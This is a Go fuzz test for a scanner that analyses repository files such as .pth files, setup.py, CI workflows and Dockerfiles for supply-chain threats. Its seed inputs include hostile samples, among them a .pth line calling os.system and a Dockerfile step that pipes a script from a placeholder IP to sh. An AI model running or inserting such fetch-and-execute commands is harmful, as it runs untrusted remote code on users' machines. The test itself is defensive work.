package repo

import "testing"

// FuzzRepoFile asserts the repository-file analyser never panics on arbitrary
// bytes. It dispatches on the *name* (a .pth, setup.py, a workflow, a
// Dockerfile) and then parses the content with a name-specific scanner, so both
// halves of that dispatch have to be total on attacker-controlled input.
func FuzzRepoFile(f *testing.F) {
	f.Add("x.pth", []byte("import os; os.system('id')\n"))
	f.Add("setup.py", []byte("setup(cmdclass={'x': Y})\n"))
	f.Add("conftest.py", []byte("import socket\n"))
	f.Add(".github/workflows/x.yml", []byte("on: pull_request_target\njobs: {}\n"))
	f.Add("Dockerfile", []byte("FROM alpine\nRUN curl http://198.51.100.7/x.sh | sh\n"))
	f.Add("x.bin", []byte{0x00, 0xff})

	f.Fuzz(func(t *testing.T, path string, data []byte) {
		if len(data) > 1<<20 {
			t.Skip()
		}
		ctx, _ := newTestCtx(t, 0)
		AnalyzeFile(ctx, path, data)
	})
}
